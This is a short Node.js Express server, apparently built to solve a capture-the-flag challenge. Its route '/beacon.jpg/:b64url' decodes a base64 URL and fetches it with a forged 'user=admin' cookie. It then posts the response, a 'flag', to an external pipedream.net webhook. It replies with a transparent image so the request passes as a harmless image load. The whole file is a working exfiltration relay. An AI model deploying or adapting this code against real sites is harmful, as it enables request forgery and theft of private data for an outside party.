import express from 'express';
import fetch from 'node-fetch';
import { Buffer } from 'buffer';

const app = express();
const PORT = process.env.PORT || 8080;

const WEBHOOK_URL = 'https://eoa0a3qqgsiiqb4.m.pipedream.net';

// 新バージョン: base64でURLをパスとして渡す形式
app.get('/beacon.jpg/:b64url', async (req, res) => {
  try {
    const target = Buffer.from(req.params.b64url, 'base64').toString();

    const flagRes = await fetch(target, {
      headers: { cookie: 'user=admin' }
    });

    const flagText = await flagRes.text();

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: flagText,
      headers: { 'Content-Type': 'text/plain' }
    });

    const transparentGif = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADElEQVR42mP8z/C/HwAFAgH/YOEGiQAAAABJRU5ErkJggg==',
      'base64'
    );

    res.setHeader('Content-Type', 'image/png');
    res.send(transparentGif);
  } catch (err) {
    console.error('[beacon-path] error:', err);
    res.status(500).send('error');
  }
});
